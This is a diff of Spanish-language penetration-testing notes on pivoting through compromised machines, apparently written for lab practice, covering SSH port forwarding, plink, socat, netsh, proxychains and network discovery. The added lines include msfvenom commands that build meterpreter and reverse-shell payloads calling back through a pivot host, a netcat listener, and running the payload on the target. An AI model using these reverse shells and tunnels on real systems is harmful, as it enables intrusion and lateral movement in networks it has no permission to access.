@@ -4,60 +4,74 @@ NOTA: Si hemos accedido a través de una `revshell` simple a la máquina sobre l
 ### SSH - Linux
 #### Local port forwarding
 ##### Para parecer que el tráfico proviene de localhost 
-Es útil para acceder a servicios locales en una máquina remota como si estuvieran en nuestra máquina local.
-```bash
-ssh -NfL 1234:localhost:3306 username@$target
-```
-- `-N` (No Remote Command)
-Después de escribir esto, el puerto `1234` de nuestra máquina local escucha conexiones, redirigiendo el tráfico al puerto `3306` de `$target`
-Podríamos conectarnos al cliente MySQL de la siguiente manera: 
+Es útil para acceder a servicios locales en una máquina remota como si estuvieran en nuestra máquina local. En este caso `$target` debe tener un servidor ssh. Supongamos que queremos conectarnos a MySQL desde `$pwnbox` a un servidor MySQL que solo acepta conexiones locales
+- Hacemos que nuestra `$pwnbox` esté en escucha en el puerto `1234` y redirija el tráfico al puerto 3306 de `$target`. Desde `$pwnbox` : 
+	```bash
+	ssh -NfL 1234:localhost:3306 username@$target
+	```
+- Desde `$pwnbox`  escribimos
 ```bash
 mysql -h 127.0.0.1 -P 1234 -u root -p
 # mysql -h localhost -P 1234 -u root -p # -> Podría no funcionar
 ```
-Y desde la perspectiva de `$target` el tráfico parece provenir de `localhost`
-##### Para conectar con `$target` a través de `$pivot`
-Si no tenemos acceso a `$target` desde nuestra pwnbox, pero sí desde `$pivot`, podemos hacer lo siguiente (supongamos que queremos conectarnos vía RDP  a `$target`)
-```bash
-# Escucha solo en localhost. Solo la máquina que ejecuta el comando puede acceder al puerto 33389
-ssh -NfL 33389:$target:3389 user_on_pivot@$pivot
-# Escucha en todas las interfaces. Cualquier máquina puede acceder a 33389
-ssh -NfL 0.0.0.0:33389:$target:3389 user_on_pivot@$pivot
-```
-Seguido de: 
-```bash
-xfreerdp /v:localhost /u:username_on_target /p:password_on_target /port:33389
-```
-- El tráfico enviado al puerto **`33389`** en tu máquina local será redirigido al puerto **`3389`** en **`$target`** a través de **`$pivot`**.
-- Desde la perspectiva de **`$target`**, el tráfico parece provenir de **`$pivot`**, cumpliendo cualquier restricción que limite las conexiones RDP al origen `$pivot`.
+Bajo la perspectiva de `$target` el tráfico parece provenir de `localhost`
+##### Conectar desde `$pwnbox` a `$target` a través de `$pivot`
+Tenemos aceso a `$pivot` y no tenemos acceso a `$target` desde nuestra pwnbox, pero sí desde `$pivot`.  Supongamos que queremos conectarnos vía  RDP  a `$target`
+- Hacemos que nuestra pwnbox esté en escucha en el puerto 33389 y redirija el tráfico al puerto 3389 de `$target`. Desde `$pwnbox`
+	```bash
+	# Escucha solo en localhost. Solo la máquina que ejecuta el comando puede acceder al puerto 33389
+	ssh -NfL 33389:$target:3389 user_on_pivot@$pivot
+	```
+- En nuestra  `$pwnbox`: 
+	```bash
+	xfreerdp /v:localhost /u:username_on_target /p:password_on_target /port:33389
+	```
+Desde la perspectiva de **`$target`**, el tráfico parece provenir de **`$pivot`**, cumpliendo cualquier restricción que limite las conexiones RDP al origen `$pivot`.
+##### Conectar desde `$pwnbox` a `$target`: desde `$pwned` a través de `$pivot`
+Escenario en el que desde `$pwnbox` tenemos una máquina comprometida, `$pwned`, que tiene acceso a `$pivot` vía ssh  y `$pivot` a su vez tiene visibilidad con `$target`. Supongamos que nos queremos conectar a un servidor SMB de `$target` desde `$pwnbox`
+- Hacemos que `$pwned` esté en escucha en el puerto `4445`, redirigiendo todo el tráfico al puerto 445 de `$target`. Desde `$pwned`
+	```bash
+	# Escucha en todas las interfaces. Cualquier máquina puede acceder a 4445
+	ssh -NfL 0.0.0.0:4445:$target:445 user_on_pivot@$pivot
+	```
+- Desde `$pwnbox`
+	```bash
+	smbclient -p 4455 //$pwned/info -U hr_admin --password=Welcome1234
+	```
+
 #### Dynamic Port Forwarding
 Crea un túnel SOCKS (proxy) en el puerto especificado. Cuando se ejecute una herramienta sobre proxychains, para `$target` será como si la conexión fuera de `$pivot`
 ```bash
 # Si lo hacemos desde nuestra pwnbox. Solo nuestra máquina puede conectarse al puerto 9050
 ssh -NfD 9050 ubuntu@$pivot
-# El siguiente comando permite que cualquier máquina se conecte al puerto 9050. Si lo hacemos desde una máquina pivote
+# El siguiente comando permite que cualquier máquina se conecte al puerto 9050. Si lo hacemos desde $pwned
 ssh -NfD 0.0.0.0:9050 ubuntu@$pivot
-# IMPORTANTE. Después de esto la última línea de /etc/proxychains4.conf debe ser algo similar a esta (la ip es de la máquina que ha ejecutado ssh -NfD ...): 
-socks5 192.168.214.63 9050
+# IMPORTANTE. Después de esto /etc/proxychains4.conf de $pwnbox tener la siguiente configuración:
+socks5 $pwned 9050
 ```
 #### Remote port forwarding
-##### Máquina víctima se comunica con nosotros
-Puede ser útil en escenarios como en el que necesitamos que la máquina víctima se comunique con nosotros , pero no tiene una ruta hacia nosotros
-```bash
- ssh -R 8080:localhost:8000 username@$pivot -vN
-```
-Este comando reenviaría el tráfico del puerto `8080` de la máquina víctima al puerto `8000` de nuestra pwnbox
-Se debería crear un exploit como el que sigue: 
-```bash
-#para meterpreter:
- msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=$pivot -f elf -o backupscript.exe LPORT=8080
-# para revshell normal
-msfvenom -p linux/x64/shell_reverse_tcp lhost=$pivot -f elf -o backupscript.exe LPORT=8080
-```
-Y tras ejecutar este exploit en la máquina víctima podríamos recibir la revshell en nuestra máquina atacante (caso revshell normal)
-```bash
-nc -nvlp 8000
-```
+##### `$target` se comunica con `$pwnbox` a través de `$pivot`
+Tenemos aceso a `$pivot` y no tenemos acceso a `$target` desde nuestra pwnbox, pero sí desde `$pivot`. En este caso queremos que `$target` se comunique con `$pwnbox`. Supongamos que queremos que `$target` envíe una revshell a `$pwnbox`
+- En este caso se pone en escucha el servidor ssh, `$pivot` en el puerto 44444, redirigiendo todo el tráfico al puerto 4444 de `$pwnbox`. Desde `$pwnbox`: 
+	```bash
+	# En pivot el tráfico 8080 solo estaría accesible localmente
+	 ssh -R 44444:localhost:4444 username@$pivot -vN
+	```
+- Creamos un exploit en nuestra `$pwnbox` 
+	```bash
+	#Ejemplo meterpreter linux:
+	 msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=$pivot -f elf -o revshell.exe LPORT=44444
+	# Ejemplo revshell para nc en linux:
+	msfvenom -p linux/x64/shell_reverse_tcp lhost=$pivot -f elf -o revshell.exe LPORT=4444
+	```
+- Nos ponemos en escucha en `$pwnbox`
+	```bash
+	nc -nvlp 4444
+	```
+- Ejecutamos el exploit en `$target`
+	```
+	./revshell.exe
+	```
 
 - El archivo de configuración `/etc/ssh/sshd_config` debe tener el valor;
 	```bash
@@ -67,34 +81,47 @@ nc -nvlp 8000
 	```bash
 	sudo systemctl restart ssh
 	```
+##### `$target` se comunica con `$pwnbox`: desde `$pwned` a través de `$pivot`
+Escenario en el que desde `$pwnbox` tenemos una máquina comprometida, `$pwned`, que tiene acceso a `$pivot` vía ssh  y `$pivot` a su vez tiene visibilidad con `$target`. Queremos que `$target` se comunique con `$pwnbox`. Supongamos que queremos descargar un archivo que está servido en el puerto 8000 de nuestra `$pwnbox`
+- Hacemos que esté en escucha `$pivot` en el puerto 8888, redirigiendo todo el tráfico a el puerto 8000 de nuestra pwnbox. Desde `$pwned`
+	```bash
+	ssh -R 0.0.0.0:8888:localhost:8000 username@$pivot -vN
+	```
+- Desde `$target`
+	```bash
+	wget http://$pivot:8888/recurso
+	```
 ##### Solo se permite tráfico saliente en la red atacada
-Si la red a la que queremos acceder tiene un cortafuegos que no permite tráfico entrante, pero sí saliente. Supongamos que desde nuestra máquina `$pivot` queremos acceder al puerto 5432 de `$target`
-- En este caso el puerto de escucha del reenvío de puertos está vinculado al servidor ssh (en dynamic y local está vinculado al cliente). Nuestra pwnbox debe tener activado el servicio ssh
+Si la red a la que queremos acceder tiene un cortafuegos que no permite tráfico entrante, pero sí saliente. Supongamos que desde nuestra máquina `$pwnbox` queremos acceder al puerto 5432 de `$target` y tenemos una máquina comprometida, `$pwned` (notar que aquí en realidad no hace falta ningún pivote)
+- Nuestra `$pwnbox` debe tener activado el servicio ssh
 	```bash
 	sudo systemctl start ssh
 	```
-- En la máquina pivote debemos escribir lo siguiente
+- Desde `$pwned` hacemos que `$pwnbox` esté en escucha en el puerto 2345, redirigiendo todo el tráfico al puerto 5432 de `$target`
 	```bash
-	ssh -N -R 127.0.0.1:2345:10.4.153.215:5432 an0nio@192.168.45.216
+	ssh -N -R 127.0.0.1:2345:10.4.153.215:5432 an0nio@$pwnbox
 	```
-	Aquí nuestra pwnbox escucha en el puerto 2345 y redirige el tráfico a $target:5432
-- Podríamos acceder al servicio en el puerto 5432 de $target del siguiente modo: 
+- Desde `$target`: 
 	```bash
 	psql -h 127.0.0.1 -p 2345 -U postgres
 	```
 #### Remote dynamic Port Forwarding
-Crea un reenvío de puertos dinámico en la configuración remota. El puerto proxy SOCS está vinculado al servidor ssh y el tráfico se reenvía desde el cliente ssh. 
-- Debemos tener activado el servicio ssh en nuestra pwnbox
+ La que queremos acceder tiene un cortafuegos que no permite tráfico entrante, pero sí saliente. Supongamos que queremos ejecutar nmap en `$target` desde `$pwnbox`
+- Debemos tener activado el servicio ssh en nuestra `$pwnbox`
 	```bash
 	service ssh start
 	```
-- Desde la máquina pivote escribimos lo siguiente: 
+- Desde `$pwned` hacemos que `$pwnbox` cree un túnel proxy socks en el puerto 9998
 	```
 	ssh -N -R 9998 an0nio@192.168.45.216
 	```
 - En la configuración de `/etc/proxychains4.conf` debe haber lo siguiente:
 	```bash
 	socks5 127.0.0.1 9998
+	```
+- Desde `$pwnbox`
+	```bash
+	proxychains nmap -vvv -Pn -sT --top-ports=100 $target -oN ports_$target  
 	```
 		
 
@@ -119,19 +146,16 @@ Crea un reenvío de puertos dinámico en la configuración remota. El puerto pro
 	```
 - Y tenemos un túnel socks creado con el que podemos utilizar proxychains con normalidad
 #### `plink`
-Algunas versiones de Windows no tienen cliente SSH instalado de forma nativa, por lo que hay que utilizar alguna otra herrramienta, como puede ser `plink`
-- Local port forwarding
-```bash
-plink -R 8080:localhost:80 user@remote-host
+Algunas versiones de Windows **no tienen cliente SSH instalado de forma nativa**, por lo que es necesario utilizar una herramienta alternativa como **`plink`** (de **PuTTY**). Solo permite remote port forwarding
+- Funcionamiento general
+```powershell
+cmd.exe /c echo y | plink.exe -ssh -l [attacker_username] -pw [attacker_ssh_password] -R [attacker_ip]:[attacker_port]:[victim_ip]:[victim_port] [attacker_ip]
 ```
-- Remote port forwarding
-	```bash
-	plink -L 8080:172.16.5.135:80 user@remote-host
-	```
-- Dynamic port forwarding (la flag `-ssh` es opcional, ya que asume que el protocolo por defecto es SSH)
+- Pone nuestra `$pwnbox` en escucha en el puerto `9833` y redirige todo el tráfico a localhost de `$target` (que está `$pwned`)
 	```powershell
-	plink -ssh -D 9050 ubuntu@10.129.15.50
+	C:\Windows\Temp\plink.exe -ssh -l an0nio -pw 1234 -R 127.0.0.1:9833:127.0.0.1:3389 $target
 	```
+
 ### Socat - Linux - static port forwarding
 #### Funcionamiento general
 Aunque puede desempeñar otras funciones otras funciones, nos centraremos en su uso para redirigir el tráfico entre host o redes. Es útil para máquinas intermedias de pivote
@@ -158,14 +182,9 @@ Nos sirve para pivotar si tenemos acceso a al máquina, aunque es menos potente 
 netsh interface portproxy add v4tov4 listenport=<puerto_local> listenaddress=<IP_local> connectport=<puerto_destino> connectaddress=<IP_destino>
 ```
 ##### Ejemplo revshell
-Tráfico del puerto `8080` de la máquina pivote se redirige a el `80` de la máquina final
+Tráfico del puerto `44444` de la máquina `$pwned` se redirige a el `4444` de nuestra `$pwnbox`
 ```powershell
-netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.14.18
-```
-##### Ejemplo bindshell
-El tráfico del puerto `8080` de la máquina pivote se redirige al `8443` de nuestra máquina atacante
-```powershell
-netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8443 connectaddress=172.16.5.19
+netsh interface portproxy add v4tov4 listenport=44444 listenaddress=0.0.0.0 connectport=4444 connectaddress=$pwnbox
 ```
 #### Comprobar port forward
 ```cmd
@@ -178,7 +197,7 @@ netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
 ## Proxychains
 Proxychains es una herramienta que puede interceptar las llamadas al sistema de red (`syscalls`) y redirigirlas a través de un proxy (SOCKS o HTTP) configurado en su archivo de configuración
 #### Configuración - `/etc/proxychains4.conf`
-Para que funcione correctamente con la configuración puesta anteriormente de dynamic port forwarding, la última línea de proxychains debe tener el siguiente contenido: 
+Para que funcione correctamente con la configuración puesta anteriormente de dynamic port forwarding, la última línea de proxychains debe tener el siguiente contenido (en función de nuestros intereses) 
 ```textplain
 socks5 	127.0.0.1 9050
 ```
@@ -189,7 +208,8 @@ Esta opción evita escaneos de tipo `ICMP` que no es válido sobre proxychains. 
 ```bash
 proxychains nmap -v -sn -PS -PA $10.10.10.1-200
 ```
-#### Ping sweep desde la máquina comprometida
+## Comandos de descubrimineto sobre máquina comprometida
+### Ping sweep desde la máquina comprometida
 Si el firewall permite conexiones ICMP desde la máquina comprometida podemos ejecutar lo siguiente para descubrir
 - Máquinas linux: 
 	```bash
@@ -223,8 +243,8 @@ Si el firewall permite conexiones ICMP desde la máquina comprometida podemos ej
 	0..255 | % { 1..254 | % { $ip="172.16.$_.$_"; if (Test-Connection -Count 1 -Comp $ip -Quiet) { $ip } } }
 
 	```
-#### Descubrir puertos
-##### nmap sobre proxychains
+### Descubrir puertos
+#### nmap sobre proxychains
 Opción segura
 ```bash
 proxychains nmap -v -Pn -sT $target
@@ -233,7 +253,7 @@ Opción algo más rápida y en principio fiable:
 ```bash
 proxychains nmap -v -Pn -sT --max-rate 1000 --min-parallelism 10 -p 1-1000 $target
 ```
-##### LInux
+#### LInux
 - Con `/dev/tcp` y `timeout` (fuerza a que no se quede colgado en cada intento de conexión)
 	```bash
 	for port in {1..65535}; do timeout 1 bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null && echo "Puerto $port abierto"; done
@@ -243,7 +263,7 @@ proxychains nmap -v -Pn -sT --max-rate 1000 --min-parallelism 10 -p 1-1000 $targ
 	for port in {1..65535}; do nc -nvv -w 1 -z $target $port 2>&1 | grep succeeded; done
 	```
 
-#####  powershell
+####  powershell
 Podemos encontrar listas con los puertos más comunes [aquí](https://gist.github.com/cihanmehmet/2e383215ea83e08d01478446feac36d8#top-1000-tcp-ports-1)
 ```powershell
 $target = "172.16.5.25"
